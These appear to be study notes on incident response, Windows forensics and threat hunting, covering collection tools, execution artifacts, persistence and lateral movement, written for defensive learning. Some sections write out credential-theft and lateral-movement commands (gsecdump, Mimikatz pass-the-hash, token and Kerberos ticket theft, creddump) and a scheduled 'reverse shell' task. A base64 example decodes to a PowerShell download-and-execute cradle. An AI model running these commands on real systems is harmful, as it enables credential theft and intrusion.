# Notes on DFIR, Threat Hunting, and Malware Analysis

<br>

- [Incident Response](#incident-response)
  * [Incident Response Process](#incident-response-process)
  * [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
  * [Attack Lifecycle](#attack-lifecycle)
  * [IR Scripting](#ir-scripting)
    + [IR Using WMIC](#ir-using-wmic)
    + [IR Using PowerShell](#ir-using-powershell)
    + [Kansa](#kansa)
  * [Kansa Data Stacking Collection and Analysis](#kansa-data-stacking-collection-and-analysis)
    + [Stacking Autoruns](#stacking-autoruns)
    + [Stacking Services](#stacking-services)
    + [Stacking WMI Filters and Consumers](#stacking-wmi-filters-and-consumers)
  * [Intrusion Analysis](#intrusion-analysis)
    + [Evidence of Execution](#evidence-of-execution)
      - [Prefetch](#prefetch)
      - [ShimCache - Application Compatibility](#shimcache---application-compatibility)
      - [Amcache.hve - Application Compatibility](#amcachehve---application-compatibility)
      - [Automating & Scaling Execution Analysis](#automating---scaling-execution-analysis)
- [Windows Forensics](#windows-forensics)
  * [SANS Windows Forensic Analysis Poster](#sans-windows-forensic-analysis-poster)
  * [Registy Overview](#registy-overview)
  * [Users and Groups](#users-and-groups)
  * [System Configuration](#system-configuration)
- [Threat Hunting](#threat-hunting)
  * [Common Malware Names](#common-malware-names)
  * [Common Malware Locations](#common-malware-locations)
  * [Living of the Land Binaries](#living-of-the-land-binaries)
  * [Persitence Locations](#persitence-locations)
    + [Common Autostart Locations](#common-autostart-locations)
    + [Services](#services)
    + [Scheduled Tasks](#scheduled-tasks)
    + [DLL Hijacking](#dll-hijacking)
    + [Hunting DLL Hijacking](#hunting-dll-hijacking)
    + [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
    + [Hunting WMI Persistence](#hunting-wmi-persistence)
    + [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
  * [Lateral Movement](#lateral-movement)
    + [Detecting Credential Harvesting](#detecting-credential-harvesting)
    + [Hashes](#hashes)
    + [Credential Availability on Targets](#credential-availability-on-targets)
    + [Tokens](#tokens)
    + [Cached Credentials](#cached-credentials)
    + [LSA Secrets](#lsa-secrets)
    + [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
    + [Tickets - Kerberos](#tickets---kerberos)
    + [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
    + [Kerberos Attacks](#kerberos-attacks)
    + [NTDS.DIT](#ntdsdit)
    + [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
- [Misc](#misc)
  * [Decode Base64](#decode-base64)
  * [Powershell CommandLine Switches](#powershell-commandline-switches)

<br>

---

<br>

# Incident Response

## Incident Response Process
1. Preparation
	* Creating a response capability
	* Testing response capabilites
	* Securing Systems
	* Changes to response capabilties from lessons learned
2. Identification and Scoping
	* Alert from security tools
	* Result of threat hunting
	* Notification from user
	* Hunt for additional compromise
3. Containment/Intelligence Development
	* Identify vulnerabilities or exploits
	* Persistence Techniques
	* Lateral Movement
	* Command and Control
	* IOC developement
	* Mitigative actions to slow attacker
4. Eradication/Remediation
	* Block IPs and Domains
	* Restore systems
	* Password changes
	* Vulnerability patching
	* Prevent further adversarial access
	* Remove adversarial presence
5. Recovery
	* Improve logging (SIEM)
	* Cybersecurity Awareness
	* Segmentation
	* Password policies
	* Vulnerability management
	* Network/Endpoint visibility
6. Lessons Learned/Threat Intel Consumption
	* Verify remediations
	* Penetration tests
	* Information sharing
	* Compliance verification

<br>

## Incident Response Hierarchy of Needs
<img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />

[Ref: Matt Swann](https://github.com/swannman/ircapabilities)

<br>


## Attack Lifecycle
<img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />

<br>


## IR Scripting

### IR Using WMIC
- [Running WMI Scripts Against Multiple Computers](https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee692838(v=technet.10))
- [WMIC for incident response](https://www.sans.org/blog/wmic-for-incident-response/)
- [Like a Kid in a WMIC Candy Store](https://isc.sans.edu/diary/Tip+of+the+Day+-+Like+a+Kid+in+a+WMIC+Candy+Store/1622)
- [PoSh-R2](https://github.com/WiredPulse/PoSh-R2)

Examples
```
/node:<remote-IP> | /user:<admin acct>
```
Get Auto-Start Process
```
wmic /node:10.1.1.1 startup list full
```
Remote Process List
```
wmic /node:10.1.1.1 process get
```
Network Configuration
```
wmic /node:10.1.1.1 nicconfig get
```

<br>


### IR Using PowerShell
- [Live Response Using PowerShell](https://www.sans.org/white-papers/34302/)
- [Powershell: Forensic One-liners](https://www.ldap389.info/en/2013/06/17/powershell-forensic-onliners-regex-get-eventlog/)
- [Weekend Scripter: Using PowerShell to Aid in Security Forensics](https://devblogs.microsoft.com/scripting/weekend-scripter-using-powershell-to-aid-in-security-forensics/)
- [Use PowerShell to Perform Offline Analysis of Security Logs](https://devblogs.microsoft.com/scripting/use-powershell-to-perform-offline-analysis-of-security-logs/)
- [Learn the Easy Way to Use PowerShell to Get File Hashes](https://devblogs.microsoft.com/scripting/learn-the-easy-way-to-use-powershell-to-get-file-hashes/)
- [Use PowerShell to Compute MD5 Hashes and Find Changed Files](https://devblogs.microsoft.com/scripting/use-powershell-to-compute-md5-hashes-and-find-changed-files/)

Remoting
```powershell
Enter-PSSession computername
Invoke-Command -ScriptBlock -Filepath -AsJob
```
- [The Power of PowerShell Remoting](https://www.sans.org/blog/the-power-of-powershell-remoting/)
- [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.1)
- [PowerShell Remoting Performance](https://www.hofferle.com/powershell-remoting-performance/)

Authentication
- Non-interactive (Type 3) logon
- Does not cache creds
- Creds not passed to remote system (Mimikatz, Incognito)

<br>


### Kansa
**Collection**
- [Kansa GitHub](https://github.com/davehull/Kansa)
- Uses PowerShell scripting
- Can remote run executables
- Modules.conf manages what scripts run
- Omit -TargetList and Kansa will query AD for a list of computers and target all of them
	- Requires [Remote Server Administration Tools](https://www.microsoft.com/en-us/download/details.aspx?id=39296)
- -TargetCount limits the total number of systems queried
- -PushBin required by scripts that employ 3rd party binaries (will first copy binaries to targets before running)
- -Rmbin removes binaries after execution  

```powershell
.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
```

**Analysis**
- Can pre-filter and organize data
- Located in the .\Analysis folder
- Uses "stacking" (Least Frequency of Occurence)
- "Meta" scripts loook at indicators like file size
- Example
	- LogParser (LogparserStack.ps1) to stack unsigned Autoruns output from multiple Kansa output files
	- [Computer Forensics How-To: Microsoft Log Parser](https://www.sans.org/blog/computer-forensics-how-to-microsoft-log-parser/)  

**Distributed Kansa**
- Kansa has issues scaling to 1000+ systems
- Fixed with .\DistributedKansa.ps1
- Scripts included to set up distrubted Kansa-Servers
- Modules collect and send data asynchronously to ELK
- [Kansa for Enterprise scale Threat Hunting w/ Jon Ketchum](https://www.youtube.com/watch?v=ZyTbqpc7H-M)
- [Kansa for Enterprise Scale Threat Hunting](https://www.sans.org/presentations/kansa-for-enterprise-scale-threat-hunting/)

**Enable PowerShell Remoting**
- Remoting requires that all network connections be set to something other than "Public." 

1. User ```Get-NetConnectionProfile``` to check
2. If necessary, change it to Private with ```Set-NetConnectionProfile```
```powershell
Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
```
3. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
4. Run Kansa
```powershell
.\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
```

<br>

## Kansa Data Stacking Collection and Analysis

### Stacking Autoruns

1. Run ```Get-ASEPImagePathLaunchStringStack.ps1``` against autoruns data from workstations and output to csv
```powershell
.\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 >asep-workstation-stack.csv
```

2. Note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "process name" *Autorunsc.csv
```

<br>

### Stacking Services

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on services
```powershell
.\Get-LogparserStack.ps1 -FilePattern *SvcAll.csv -Delimiter "," -Direction asc -OutFile SvcAll-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- DisplayName
	- PathName
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "tbbd05" *SvcAll.csv 
```
<br>

### Stacking WMI Filters and Consumers

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on WMI Filters
```powershell
.\Get-LogparserStack.ps1 -FilePattern *WMIEvtFilter.csv -Delimiter "," -Direction asc -OutFile WMIEvtFilter-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- Query
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "PerformanceMonitor" *WMIEvtFilter.csv
```

4. Search the Kansa WMI Binding output data
```powershell
Select-String "PerformanceMonitor" *ConBind.csv
```

5. Search the Kansa WMI Event Consumer output data
```powershell
Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
```

<br>

## Intrusion Analysis

### Evidence of Execution

#### Prefetch
- Evidence of execution
	- Executable name, execution time(s), and execution count
- Limitations: Off by default on servers or workstations with SSDs
- .pf filename (compressed)
	- executable file name followed by dash and hexidecimal representation of a hash of the file's path
- Multiple .pf files with the same executable name can be indicative of two executables with the same name being run from different locations
	- Execeptions: hosting applications (svchost, dllhost, backgroundtaskhost, and rundll32) hash values calculated based off of commandline arguments

**Notes**
- First execution (creation date -10 seconds)
- Last execution (modified date -10 seconds)

**Analysis**
- Can be analyzed with PECmd.exe ```PECmd.exe -d "C:\Windows\Prefetch" --csv "G:\cases" -q```  
- [PECmd](https://github.com/EricZimmerman/PECmd)

<br>

#### ShimCache - Application Compatibility
- Available on workstations AND Servers
- Not as easy to delete as Prefetch
- Designed to detect and remediate
- Different compatibility modes are called shims
- Tracks Name, File Path, and Last Modification Time of executable
- Executables can be added to the regirsty regradless if they've been executed
	- Executable viewed via Windows GUI apps
- After XP, ShimCache no longer include execution time
- Win7 & 8/8.1 include execution flags (Win 10 does not)
	- InsertFlag = True (App Executed)

**Win 7+**  

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache
```  

- Server 2003 = 512 Entries
- Win7-10, Server 2008-2019 = 1024 Entries

**Win XP**

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache
```  

- 96 entries

**Notes**
- Most recent activities are on the top
- New entries are only written on shutdown (only exist in memory before)
- Each "ControlSet" can have its own ShimCache database
- [Leveraging the Application Compatibility Cache in Forensic Investigations](https://web.archive.org/web/20190209113245/https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf)

**Analysis**
- [AppCompatCacheParser](https://github.com/EricZimmerman/AppCompatCacheParser)

```
.\AppCompactCacheParser.exe -f .\SYSTEM --csv c:\temp
```
- Written in order of excecution or GUI discovery
- Additional tool from Mandiant: [ShimCacheParser](https://github.com/mandiant/ShimCacheParser)

<br>

#### Amcache.hve - Application Compatibility
```
C:\Windows\AppCompat\Programs\Amcache.hve
```
- Win7+
- Tracks installed applications, loaded drivers, and unassociated excectuables
- Full path, file size, file modification time, compilation time, publisher metadata
- SHA1 hashes of executables and drivers
- Entries can be due to file discovery or installation and not always execution
- [ANALYSIS OF THE AMCACHE](https://www.ssi.gouv.fr/uploads/2019/01/anssi-coriin_2019-analysis_amcache.pdf)

**Analysis**
- InventoryApplicationFile
	- FileId: SHA1 Hash
	- LinkDate: PE Header Compilation Time
	- LowerCaseLongPath: Full Path
	- ProgramId: Cross-Ref with InventoryApplication key for more info
		- Unassociated (not installed) applications dont have a ProgramId
		- Malware often does not go through the installation process
	- Size: File Size
- InventoryApplication
	- Installed Application
	- Provides Installation Date
	- Publisher information
- InventoryDriverBinary
	- Keys contain file path of driver
	- DriverId: SHA1 Hash
	- DriverLastWriteTime: Modification Time of Driver
	- DriverSigned: 1 = signed
	- Product/ProductVersion = Driver Metadata
	- Rootkits are often heavily reliant on drivers
	- Most drivers in ```C:\Windows\system32\drivers\```

- Can be parsed with [AmCacheParser](https://github.com/EricZimmerman/AmcacheParser)
```
amcacheparser.exe -i -f amcache.hve --csv G:\<folder>
```
- Leverages allowlisting and blocklisting based on SHA1

<br>

#### Automating & Scaling Execution Analysis
- Malware 101
	- One/two letter executables
	- Executions from temp ro $Recycle.Bin folders
- Common Tools
	- psexec.exe
	- wmic.exe
	- scrcons.exe
	- certutil.exe
	- rar.exe
	- wsmprovhost.exe
	- whoami.exe
	- schtasks.exe
- IOCs
	- Known Malware
	- Tools
	- Staging directories

**[appcompatprocessor.py](https://github.com/mbevilacqua/appcompatprocessor)**
- Performs scalable hunting of ShimCache and Amcache artifacts
- Regex Searches + built library of common anomalies
- "Reconscan" to search for grouping of known recon tools
- [ShimCache and AmCache Enterprise-wide Hunting](https://github.com/mbevilacqua/appcompatprocessor)
- Temporal correlations of execution activity

Perform a search against built-in signatures
```
AppCompatProcessor.py database.db search
```

Perform least frequency of occurence analysis
```
AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe'"
```
<br>

---

<br>

# Windows Forensics

## SANS Windows Forensic Analysis Poster
* [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)

<br>

## Registy Overview

**System  Registry Hives**

- %WinDIr%\System32\Config
	- SAM
		- Info about user accounts
		- Password last changed
		- Last logon
		- In user accounts
	- Security
		- Access Control list
		- Stored passwords
	- System
		- Configuration data (hardware)
	- Software
		- Configuration data (software/os)
	- Default
		- Not much of use

**User Registry Hives**

- %UserProfile%
	- NTUSER.DAT
	- Most recently used files
	- Last files searched for
	- Last typed URLs
	- Last commands executed
	- Opened Files
	- Last Saved Files

- %UserProfile%\AppData\Local\Microsoft\Windows\
	- USRCLASS.DAT
	- Program Execution
	- Opened and closed folders
	- Aids User Account Control (UAC)
	- HKCU\Software\Classes

- %WinDir%\appcompat\Programs
	- AMCACHE.hve
	- Excecution data

<br>

## Users and Groups

- SAM\Domains\Account\Users\
- Username
- Relative Identifier
- User Login Information
	- Last Login
	- Last Failed Login
	- Logon Count
	- Password Policy
	- Account Creation Time
- Group Information
	- Administrators
	- Users
	- Remote Desktop Users

<br>

## System Configuration

**Identify Current Control Set**
- SYSTEM\Select
- Systems Configuration Settings
- Identify what ControlSet is in use
		
**Identify Microsoft OS Version**
- MS Windows Version
	- ProductName
	- ReleaseID (YYMM)
- Service Pack Level
- Install Date of the last version/major update
	- InstallDate
- SOFTWARE\Microsoft\Windows NT\CurrentVersion
		
**Computer Name**
- SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
- Name linked to log files, network connections
- Verify the PC that is being examined
	
**Time Zone of the Machine**
- System\CurrentControlSet\Control\TimeZoneInformation
- Correlation Activity
- Log Files\TimeStamps

**Network Interfaces**
- SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
- Static or DHCP
- Ties machines to network activity
- Interface GUID for additional profiling
	
**Historical Networks**
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache
- Identify Networks Computer has been connected to
- Could be wired or wireless
- Domain/intranet Name
- Identify SSID
- Identify Gateway MAC Address
- First and Last Time network connection was made
- Networks that have been connected to via VPN
- MAC address of SSID for Gateway can be physically triangulated
- Write Down ProfileGUID

**Network Types**
- SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\{GUID} (XP)
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles (Win7-10)
- ID the type of network that the computer connected to
- ID wireless SSIDs that the computer previously connected to
	- ProfileName
- Time is recorded in LOCAL TIME, NOT UTC
- First and Last Connection Time
	- DateCreated
	- DateLastConnected
- Determine Type using Nametype
	- 6 (0x06) = Wired
	- 23 (0x17) = VPN
	- 71 (0x47) = Wireless
	- 243 (0xF3) = Mobile Broadband
- Network Category
	- Category
	- (Public) 0 - Sharing Disabled
	- (Private) 1 - Home, Sharing Enabled
	- (Domain) 2 - Work, Sharing Enabled
- Geolocate
	- Wigle.net
	
**System AutoStart Programs**
- Programs exhibiting persistence
	- User login
	- Boot time
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
- Software\Microsoft\Windows\CurrentVersion\Run
- (Services) SYSTEM\CurrentControlSet\Services
- IF start set to 0x02, then service application will start at boot (0x00 for drivers)(
- Determine programs that start automatically
- Useful for finding malware on a machine that installs on boot such as a rootkit
- Look at when the time key was last updated; generally last boot time of the system
	
**Last Shutdown Time**
- Discover when the system was last shutdown
- How many successful times the system was shutdown
- SYSTEM\CurrentControlSet\Control\Windows (Shutdown Time)
- SYSTEM\CurrentControlSet\Control\Watchdog\Display (Shutdown Count) - XP only
- Detect certain types of activity
- Determine if the user properly shuts down their machine


---

<br>

# Threat Hunting

## Common Malware Names
* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)

<br>

## Common Malware Locations
* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)

<br>

## Living of the Land Binaries
* [LOLBAS Project](https://lolbas-project.github.io/)

<br>

## Persitence Locations

### Common Autostart Locations
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Tools**
* Autoruns
* Kansa

<br>

### Services
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services

**Tools**
* Autoruns
* "sc" command
* Kansa

<br>

### Scheduled Tasks
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Tools:
- Autoruns
- Kansa

<br>

### DLL Hijacking

DLL Search Order Hijacking
- Place malicious file ahead of DLL in search order
- Windows looks at Application directory prior to Windows/System32 folder
- Look at exe's import table
- Exception: DLLs present in the KnownDLLs Registry Key

Phantom DLL Hijacking
- Find DLLs that applications attempt to load, but doesn't exist

DLL Side Loading
- WinSXS provides a new version of a legit DLL

Relative Path DLL Hijacking
- Copy target .exe and corresponding bad .dll to a different location

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%

<br>

### Hunting DLL Hijacking
- Machines rarely get new dlls (Application Install/Patching)

File system analysis
- Look for new or unsigned .exe/.dll files in unusual places

Memory Analysis
- Find system process or DLLs loaded from the wrong location

This technique is often followed up C2 network beaconing

<br>

### WMI Event Consumer Backdoors
- Allows triggers to be set that will run scripts and executables
- Event Filter: Trigger Condition
- Event Consumer: Script or executable to run
- Binding: Combine Filter and Consumer

Tools
- Kansa
- Autoruns

Discover Suspicious WMI Events
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```
<br>

### Hunting WMI Persistence
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)

<br>

### Hunt and Analyze Persistence with Autoruns
- Live System Only
- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
- Hashes files and can search VirusTotal for hits

1. Run autorunsc
 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```
2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
3. Filter out trusted startup locations
	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
	- Look for:
		- (Not Verified)
		- Unfamiliar Signers
		- Blank (No Signer)
4. Filter by Enabled (Active)
5. Compare hashes to VirusTotal
6. Research vendor and product listed in "Publisher" and "Description" fields
7. Compare output to a the output of a known good machine

<br>

## Lateral Movement

### Detecting Credential Harvesting
- Event Logs
	- 4624 Logons
	- 4720 Account Creation
	- 4776 Local Account Auth
	- 4672 Privileged Account Usage
- Unix "secure"logs
- Auditing New Accounts
- Anomalous Logins
	- Workstation to Workstation
	- Sensitive Networks
- After Hour Logins

**Mitigations (Win10)**
- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
- Remote Credential Guard: RDP without pushing credentials to remote target
- Device Guard (Prevent execution of untrusted code)

**Hunt Notes**
- WDigest Plaintext Credentials
	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
		- UseLogonCredential = "1" (Should be 0)

<br>

### Hashes
- Availabe in the LSASS process
- Can be extracted with admin privileges
- Local account password hashes are available in the SAM hive in memory or on disk
- Domain account hashes are present in memory during interactive sessions

**Common Tools**
- Mimikatz
- fgdump
- gsecdump
- Metasploit
- AceHash
- PWDumpX
- creddump
- WCE

**Pash-the-Hash Attack**
- Authenticate using a stolen account hash without knowing the cleartext password
	- Tools: Metasploit PsExec module, WCE, and SMBshell
- Limited to NTLM authentication
- Often used to map shares, perform PsExec-style remote execution, and WMI
- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)

**Examples**
- Hash dump with Gsecdump
```
gsecdump.exe -a > 1.txt
```

- Pass the Hash (Mimikatz)
```
mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
```

<br>

### Credential Availability on Targets

| **Admin Action** | **Logon**<br>**Type** | **Credentials**<br>**on Target?** | **Notes** |
| :---------------: | :---------------: | :---------------: | :---------------: |
| Console Logon | 2   | Yes*   |   *Except when Credential Guard is enabled  |
| RunAs | 2   | Yes*   |  *Except when Credential Guard is enabled    |
| Remote Desktop | 10   | Yes*   | *Except when Remote Credential Guard is enabled    |
| Net Use | 3   | No   | Including /u:parameter    |
| PowerShell Remoting | 3   | No   | Invoke-Command; Enter-PSSession   |
| PsExec Alternate Creds | 3+2   | Yes    | -u <<username>> -p <<password>>   |
| PsExec w/o Explicit Creds | 3   |  No   |    |
| Remote Scheduled Task | 4   | Yes    | Password saved as LSA Secret   |
| Run as a Service | 5   | Yes    | (w/user account)-Password saved as LSA Secret   |
| Remote Registry | 3   | No    |    |

<br> 

### Tokens
- Targets user sessions and running services
- Used for SSO
- Attacker can impersonate user's security context
- ```SeImpersonate``` privileges let tokens be copied from processes (also SYTEM or admin)
- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
- Often used to escalate from local to domain admin

**Token Stealing (Mimikatz)**
- Assumes attacker has local admin
```
mimikatz # privilege::debug
mimikatz # token:whoami
mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
```

**Common Tools**
- Incognito
- Metasploit
- PowerShell (PowerShell Empire)
- Mimikatz

**Hunting**
- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)

<br>

### Cached Credentials
- Stored domain credentials to allow logons when off domain
- Cached credentials hashes have to be cracked
- Salted and case-sensitive (slow to crack)
- Cannot be used in pass the hash
- Stored in the SECURITY\Cache registry key
- Admin or SYSTEM privileges required
- Hashes cracked with John the Ripper or hashcat

**Common Tools**
- cachedump
- Metasploit
- PWDumpX
- creddump
- AceHash

**Cached Credential Extraction with Creddump**

```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes


<br>

### LSA Secrets
- Credential stored in registry to allow services or tasks to be run with user privileges
- May also hold application passwords like VPN or auto-logon credentials
- Admin privileges allow access to encrypted registry data and keys necessary to decrypt
	- Stored SECURITY/Policy/Secrets
	- Parent key in SECURITY/Policy can decode
- Passwords are plaintext

<br>

### Decrypt LSA Secrets with Nishang
- Requires Admin
- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
- Dump registry data with ```Get-LsaSecret.ps1```  

**Common Tools**
- Cain
- Metasploit
- Mimikatz
- gsecdump
- AceHash
- creddump
- PowerShell

<br>

### Tickets - Kerberos
- Kerberos issues tickets to authenticated users
- Cached in memory and valid for 10 hours
- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)

**Common Tools**
- Mimikatz
- WCE
- kerberoast

<br>

### Pass the Ticket with Mimikatz
- Dump Tickets
```mimikatz # sekurlsa::tickets /export```
- Import ticket elsewhere
```mimikatz # keberos::ptt [ticket]```
- Now available to authenticate to throughout environment

<br>

### Kerberos Attacks
- Pass the Ticket
	- Steal Ticket from memory and pass or import on other systems
- Overpass the Hash
	- Use NT hash to request a service ticket from the same account
- Kerberoasting
	- Request service ticket for highly privileged service and crack NT hash
- Golden Ticket
	- Kerberos TGT for any account with no expiration. Survives full password reset
- Silver Ticket
	- All-access pass for a single service or computer
- Skeleton Key
	- Patch LSASS on domain controller to add backdoor password that works for any domain account
- DCSync
	- Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC
- [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)

<br>

### NTDS.DIT
- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
- Encrypted but algorithm is easy to decrypt
- Located in the \Windows\NTDS folder on Domain Controller
- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service

**Common Tools**
- ntdsutil
- VSSAdmin
- NTDSXtract
- Metasploit
- PowerShell
- secretsdump.py

<br>

### Bloodhound - Find a Path to Domain Admin
- Active Directory relationship graphing tool
	- Nodes: Users, Computers, Groups, OUs, GPOs
	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
	- Paths: A list of nodes connected by edges (Path to Domain Admin)
	- Visualizes dangerous trust relationships and misconfigurations
	- Reduces brute-force effort required
	- Difficult to detect (Uses prodominantly LDAP)
		- Uses cached LDAP connections
	- [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
		- Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement
	- [GoFetch](https://github.com/GoFetchAD/GoFetch)
		- Automates BloodHound findings
		- Uses ```Invoke-Mimikatz``` and ```Invoke-Psexec``` to auto cred theft and lateral movement
	- [BloodHound](https://github.com/BloodHoundAD/BloodHound)

	<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />


<br>

---

<br>

# Misc

## Decode Base64

```bash
echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

<br>

## Powershell CommandLine Switches
- -W: WindowStyle
- -nop: NoProfile
- -noni: NonInteractive
- -ec: EncodedCommand